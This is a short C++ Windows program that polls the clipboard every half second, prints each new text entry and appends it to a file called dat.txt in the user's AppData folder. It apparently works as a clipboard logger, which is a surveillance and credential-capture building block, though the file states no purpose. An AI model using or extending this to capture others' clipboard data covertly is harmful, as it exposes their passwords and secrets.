#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <fstream>
#include <algorithm>
#include <Windows.h>
#include <shlobj_core.h>
#include <stdlib.h>
#include <stdio.h>

int main() {
	//setlocale(LC_ALL, "RUS");
	std::string ClipboardText[2];
	//char* ClipboardText[2];
	char last[2] = { 0, 0 };
	std::string AppDataPath = getenv("APPDATA");

	for (;;) {
		Sleep(500);
		if (IsClipboardFormatAvailable(CF_TEXT) == true) {
			OpenClipboard(0);
			HANDLE hData = GetClipboardData(CF_TEXT);
			ClipboardText[1] = static_cast<char*>(GlobalLock(hData));
			//GlobalUnlock(hData);

			if (ClipboardText[0] != ClipboardText[1]) {
				ClipboardText[0] = ClipboardText[1];
				std::cout << ClipboardText[1] << std::endl;
				std::fstream LogFile;
				LogFile.open(AppDataPath + "\\dat.txt", std::fstream::app);
				if (LogFile.is_open()) {
					LogFile << ClipboardText[1] << std::endl;
					LogFile.close();
				}
			}
			CloseClipboard();
		}
	}
	return 0;
}
